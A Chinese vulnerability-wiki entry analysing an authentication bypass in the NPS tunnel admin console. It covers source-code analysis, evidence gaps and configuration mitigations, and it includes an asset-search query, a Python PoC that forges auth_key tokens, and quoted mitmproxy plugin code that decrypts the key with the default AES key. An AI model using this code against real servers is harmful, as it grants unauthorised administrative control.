---
source: "wy876 漏洞文库"
title: "nps auth_key未授权访问漏洞"
product: "NPS内网穿透管理端"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "原文分支：auth_key 未配置或为空；补充分支：auth_key 非空而 auth_crypt_key 仍为公开默认值 1234567812345678；均需管理端及实际 web_base_url 可达、逐请求认证参数匹配且时间戳与服务器差不超过20秒；历史工具 GET 与官方文档 POST 的运行等价性未验证"
hunter: "app.name==\"NPS\""
source_status: "unknown"
side_effects: "未运行；已读历史 main.py 在 mitmproxy load 回调向配置目标发送一次 GET、将恢复的配置 auth_key 打印到本地标准输出，request 回调无主机/路径/方法过滤地重写 auth_key 和 timestamp 查询参数；依赖导入与两个扫描器未审阅，README 示例含 --ssl-insecure"
id: "vw-3a83d3344f2b2d39bffdd31c"
entity_id: "ve-3a83d3344f2b2d39bffdd31c"
schema_version: "1"
version: "原文完整范围 unknown；补充方法已静态核对 ehang-io/nps v0.26.10，限管理端可达、auth_key 非空且 auth_crypt_key 保留公开默认值的配置，不推定首次受影响版本或其他发行包"
fixed_version: "unknown；未核实非空 auth_key 与默认 auth_crypt_key 分支的首次修复发行版，yisier/nps v0.26.14 不能据本次源码比较列为该分支修复"
verification_source: "https://github.com/ehang-io/nps/blob/c9a4d8285b30c3c140782fc660bfc3d6961262ed/docs/api.md#L29-L42; https://github.com/ehang-io/nps/blob/c9a4d8285b30c3c140782fc660bfc3d6961262ed/conf/nps.conf#L51-L54; https://github.com/ehang-io/nps/blob/c9a4d8285b30c3c140782fc660bfc3d6961262ed/web/controllers/auth.go#L11-L35; https://github.com/ehang-io/nps/blob/c9a4d8285b30c3c140782fc660bfc3d6961262ed/web/controllers/base.go#L29-L43; https://github.com/rabbitmask/nps-auth-bypass/blob/159e575fe28687fdc0c7eeb749e06b24af862b69/main.py#L29-L60; https://github.com/yisier/nps/blob/ab81f5b68ea896c1cde76b6ae04dee11be9d477a/web/controllers/base.go#L29-L46"
previous_prerequisites: "空配置密钥、20秒时间窗口，持续请求需更新认证参数"
previous_side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
---

# nps auth_key未授权访问漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：空配置密钥、20秒时间窗口，持续请求需更新认证参数
- 证据范围：与421同漏洞，补充逐请求注入说明有用，但插件没有名称/下载来源和实现。

### 本次正文校订

- 按该篇代码内容修正错误的 Java 语言标记。
- 将误放入 FOFA 的 Hunter 查询按正文原式保存到 hunter 字段，不改写查询语义。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- fofa字段app.name==截断且正文为Hunter语法，索引平台错误
- Python代码块误标java
- 版本只有产品名、页面/结果截图引用全缺失
- 所有后台功能全都可用未经逐权限验证，当前只有断言
- 缺修复/来源原始commit

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

# 一、漏洞简介
nps是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持tcp、udp流量转发，可支持任何tcp、udp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等），此外还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端。其中auth_key 存在未授权访问漏洞，当 nps.conf 中的 auth_key 未配置时攻击者通过生成特定的请求包可以获取服务器后台权限。

# 二、影响版本
+ nps

# 三、资产测绘
hunter：`app.name=="NPS"`


登陆页面：


# 四、漏洞复现
nps认证方式是通过配置文件nps.conf中的auth_key与timestamp的md5形式进行认证，但在默认的配置文件中，auth_key 默认被注释，所以只需要可以获取到的参数 timestamp 就可以绕过认证登录。

```python
import time
import hashlib
now = time.time()
m = hashlib.md5()
m.update(str(int(now)).encode("utf8"))
auth_key = m.hexdigest()
 
print("Index/Index?auth_key=%s&timestamp=%s" % (auth_key,int(now)))
```


成功绕过进入后台


NPS存在一个身份验证的缺陷，无需登录，直接进后台，后台功能点全都可以用。具体利用是伪造两个参数auth_key、timestamp。由于参数的生命周期只有20秒，20秒过后就需要重新伪造，故采用burp插件。

插件所有的功能集成到了Burp的右键中：

1、首先访问nps站点，拦截请求包，启用插件 


2、点击“查看仪表盘”会修改请求包，之后直接放行数据包成功登陆后台，后续每一个请求都会自动贴上身份验证参数。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pxqopzr7q1gwysu2>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）


## 来源补充：默认加密密钥下的非空 auth_key 获取方法

本节补充原文未覆盖的一条配置分支：即使管理员已设置非空 `auth_key`，只要管理端可达、`auth_crypt_key` 仍是公开默认值，所核对的 NPS 源码仍提供返回 `auth_key` 密文的接口；公开工具利用默认加密密钥解密后，再为每次请求计算认证参数。这里的“可达”包括部署层访问控制和实际配置的 `web_base_url`。本节仅作源码与公开材料整理，未运行工具、连接目标或确认实际部署结果。

### 来源身份与版本范围

- 工具入口为 FrameVul #352 所记的 [carr0t2/nps-auth-bypass](https://github.com/carr0t2/nps-auth-bypass)。原地址及 GitHub 所记上游 `Phuong39/nps-auth-bypass` 在本次来源核对中均未取得可用仓库内容；实际阅读的是固定提交下的 [rabbitmask/nps-auth-bypass/main.py](https://github.com/rabbitmask/nps-auth-bypass/blob/159e575fe28687fdc0c7eeb749e06b24af862b69/main.py#L1-L63)，其第 8 行直接标注 carr0t2 项目地址。[原项目 issue #1090 的历史评论](https://github.com/ehang-io/nps/issues/1090#issuecomment-1220456031)也给出该地址。这些证据支持来源归属线索，不证明已恢复原仓库字节、原始 HEAD 或完整历史。
- 产品端已核对 `ehang-io/nps v0.26.10`。已保存的 tag 记录指向本节一手源码链接所固定的提交，且 [lib/version/version.go 第 3 行](https://github.com/ehang-io/nps/blob/c9a4d8285b30c3c140782fc660bfc3d6961262ed/lib/version/version.go#L3)声明 `0.26.10`。这是本次最早实际核对的发行版本，不代表漏洞首次出现于该版，也不据此推定全部更早版本受影响。
- 另核对的原项目 master 快照 `ab648d6f0c618c690a7a79948a7ebd686e1cdafc` 中，配置、路由、认证控制器、基础控制器、加解密实现和版本文件的六个相关 Git blob 与上述版本一致。这个快照比较不扩大为所有分支、后续版本或第三方发行包的结论。
- 本补充方法的已验证修复版本为 `unknown`。未根据标题、相近漏洞或搜索结果补填 CVE。

### 配置前提与源码数据流

v0.26.10 的 [conf/nps.conf 第 53–54 行](https://github.com/ehang-io/nps/blob/c9a4d8285b30c3c140782fc660bfc3d6961262ed/conf/nps.conf#L51-L54)原样为：

```ini
#auth_key=test
auth_crypt_key =1234567812345678
```

上面展示的是发布源码附带的配置值；本节新增分支讨论的是管理员已把 `auth_key` 改成非空值、却仍保留该 `auth_crypt_key` 的情况。默认样例不能说明实际部署比例。原文的空 `auth_key` 时间戳方法仍作为独立前提保留。

1. [docs/api.md](https://github.com/ehang-io/nps/blob/c9a4d8285b30c3c140782fc660bfc3d6961262ed/docs/api.md#L29-L42)公开描述了获取服务端密钥的接口，方法和路径原样为 `POST /auth/getauthkey`；返回十六进制编码的 AES-CBC 密文，解密密钥长 128 位，IV 与密钥相同。文档称填充为 `pkcs5padding`；[lib/crypt/crypt.go](https://github.com/ehang-io/nps/blob/c9a4d8285b30c3c140782fc660bfc3d6961262ed/lib/crypt/crypt.go#L15-L25)实际按 AES 块大小调用名为 `PKCS5Padding` 的函数，[第 43–46 行](https://github.com/ehang-io/nps/blob/c9a4d8285b30c3c140782fc660bfc3d6961262ed/lib/crypt/crypt.go#L43-L46)给出具体填充实现。
2. [web/routers/router.go](https://github.com/ehang-io/nps/blob/c9a4d8285b30c3c140782fc660bfc3d6961262ed/web/routers/router.go#L8-L25)通过 AutoRouter/NSAutoRouter 注册 `AuthController`，并处理 `web_base_url` 前缀。[web/controllers/auth.go](https://github.com/ehang-io/nps/blob/c9a4d8285b30c3c140782fc660bfc3d6961262ed/web/controllers/auth.go#L11-L35)中的 `AuthController` 直接嵌入 `beego.Controller`，没有继承 `BaseController.Prepare` 的那段 API/登录认证逻辑；`GetAuthKey` 内只在加密密钥长度不是 16 或加密出错时返回失败，否则读取配置的 `auth_key`，使用 `auth_crypt_key` 加密，并将十六进制密文放入 `crypt_auth_key`。这说明了本次所读控制器里的检查边界，不代替对所有部署层防护的核实。
3. 工具的 [main.py 第 29–47 行](https://github.com/rabbitmask/nps-auth-bypass/blob/159e575fe28687fdc0c7eeb749e06b24af862b69/main.py#L29-L47)先取回 `crypt_auth_key`，再用上述公开默认值同时作为 AES 密钥和 IV，解密并去除填充，将结果保存到 `self.config_auth_key`。
4. 每次被代理请求进入 [main.py 第 49–60 行](https://github.com/rabbitmask/nps-auth-bypass/blob/159e575fe28687fdc0c7eeb749e06b24af862b69/main.py#L49-L60)时，工具用恢复的配置密钥和新生成的整数时间戳计算 MD5，重写查询参数 `auth_key`、`timestamp`。对应的产品检查在 [web/controllers/base.go 第 29–43 行](https://github.com/ehang-io/nps/blob/c9a4d8285b30c3c140782fc660bfc3d6961262ed/web/controllers/base.go#L29-L43)：MD5 必须匹配，且时间戳与服务器时间的差不超过 20 秒；匹配后设置 `isAdmin`。这些源码支持逐请求认证数据流，不足以证明永久登录会话或历史正文所称的所有后台功能均已验证。

### 已公开方法的具体片段与使用边界

以下是固定工具提交 `main.py` 第 34–44 行的原样片段，保留变量名、路径、公开默认值及打印语句；它是已阅读的历史代码，不是本次运行记录：

```python
            url = loader.master.options.mode[8:].rstrip('/')
            burp0_url = url + '/auth/getauthkey'
            r = requests.get(burp0_url, timeout=2)
            crypt_auth_key = r.json()['crypt_auth_key']
            defaul_aes_key = b'1234567812345678'
            b_key = bytes.fromhex(crypt_auth_key)
            enc = AES.new(key=defaul_aes_key, mode=AES.MODE_CBC, iv=defaul_aes_key)
            config_auth_key = enc.decrypt(b_key).decode()
            config_auth_key = config_auth_key[0:-ord(config_auth_key[-1])]  # 去填充
            self.config_auth_key = config_auth_key
            print('成功获取config_auth_key', config_auth_key.encode())
```

第 50–54 行继续生成并写入每次请求的参数：

```python
        r = flow.request
        now_timestamp = str(int(time.time()))
        auth_key = self.md5(self.config_auth_key + now_timestamp)
        r.query.set_all('auth_key', [auth_key])
        r.query.set_all('timestamp', [now_timestamp])
```

结合上述固定源码，可准确重建公开方法的步骤：在满足配置前提的授权环境中，按真实 `web_base_url` 定位密钥获取接口；仅在成功取得可按上述代码解码、解密的有效响应后，取响应里的 `crypt_auth_key` 十六进制字符串；按源码所示的默认 AES 密钥、相同 IV 和去填充步骤得到配置 `auth_key`；将它与当前整数时间戳拼接后计算 MD5；后续各请求分别附带新生成的 `auth_key` 和 `timestamp`。这不是新增实现，也没有新增目标、样例密文、响应或成功输出。

需要保留一个明确差异：官方文档写的是 POST，而上面的历史工具调用 `requests.get`。本次没有独立阅读 Beego 的方法路由实现，也没有执行请求，因此不将 GET 与 POST 的可用性写成已验证等价，不把该脚本表述为当前环境下开箱即用。

该实现是 mitmproxy 插件，不能据此认定它就是历史正文未署名的 Burp 插件。源码的模块级 `addons = [NpsHack()]` 只在该文件自身逻辑中构造插件对象并初始化空配置密钥；HTTP GET 和恢复密钥的标准输出发生在 mitmproxy 调用 `load` 回调时。依赖包导入阶段的行为未审阅。`request` 回调没有主机、路径或请求方法过滤，会为进入该回调的请求重写认证查询参数；其适用范围必须由代理配置约束，不能把它描述为仅作用于某个已检查的目标。

[requirements.txt](https://github.com/rabbitmask/nps-auth-bypass/blob/159e575fe28687fdc0c7eeb749e06b24af862b69/requirements.txt#L1-L4)列出的 `mitmproxy`、`requests`、`pycryptodome`、`loguru` 均未固定版本；历史 API 兼容性未验证。[README 的使用示例](https://github.com/rabbitmask/nps-auth-bypass/blob/159e575fe28687fdc0c7eeb749e06b24af862b69/README.md#L14-L19)还包含 `--ssl-insecure`，涉及上游 TLS 证书校验放宽，不能当成没有安全代价的通用启动建议。另一方面，`requests.get` 未传入 `verify` 参数，沿用 requests 默认的证书验证行为；mitmdump 的该选项没有在这次调用中传递验证设置，不能保证回调的 HTTPS 兼容性。`load` 的异常被捕获并忽略，失败时保留原来的空配置密钥；没有报错不能证明密钥获取成功。`scan.py`、`scan_multi.py`、依赖实现和效果图未在本次核对范围内，不作完整工具或产品安全审计结论。

### 配置缓解与修复版本限制

[固定 README 第 70–73 行](https://github.com/rabbitmask/nps-auth-bypass/blob/159e575fe28687fdc0c7eeb749e06b24af862b69/README.md#L70-L73)建议把 `auth_key` 改为随机值，并修改或注释 `auth_crypt_key`。结合已读产品源码，可将配置缓解准确表述为：

- 将 `auth_key` 设置为非空、不可预测的值；若仍需加密密钥获取接口，同时更换公开默认 `auth_crypt_key`，并满足产品要求的 16 字节长度。
- 若不使用加密密钥获取接口，可移除或注释 `auth_crypt_key`。根据 `GetAuthKey` 的长度检查，空值会使该接口返回失败。这只是关闭本节的密钥获取分支，仍需保留非空、不可预测的 `auth_key`。
- 仅修改 `auth_key` 不能阻断用未改动的默认加密密钥恢复它；在所核对的原版代码中，同时注释两个配置项仍会留下原文的空密钥时间戳认证分支。上述是配置与源码对应的缓解分析，未作运行验证。

[issue #1090 的评论](https://github.com/ehang-io/nps/issues/1090#issuecomment-1367731942)链接了 yisier 分支的 [v0.26.14 发布说明](https://github.com/yisier/nps/releases/tag/v0.26.14)，说明文字称修复 API 鉴权。对其发布提交的实际比较发现，[base.go 第 34–37 行](https://github.com/yisier/nps/blob/ab81f5b68ea896c1cde76b6ae04dee11be9d477a/web/controllers/base.go#L34-L37)仅在配置 `auth_key` 为空时生成随机替代值；[AuthController](https://github.com/yisier/nps/blob/ab81f5b68ea896c1cde76b6ae04dee11be9d477a/web/controllers/auth.go#L11-L35)与原版相同，[默认 auth_crypt_key](https://github.com/yisier/nps/blob/ab81f5b68ea896c1cde76b6ae04dee11be9d477a/conf/nps.conf#L51-L54)也仍存在。因此不能把该版本记为“非空 auth_key＋默认 auth_crypt_key”分支的已验证修复版本。本次没有核对该分支其他版本，`fixed_version` 保持 `unknown`。

本节的结论止于已保存的公开源码、版本指向和配置数据流；引入版本、完整影响范围、首次修复版本、GET/POST 运行差异、依赖兼容性及具体后台操作结果仍未建立。原有文章及其历史材料保持原样。
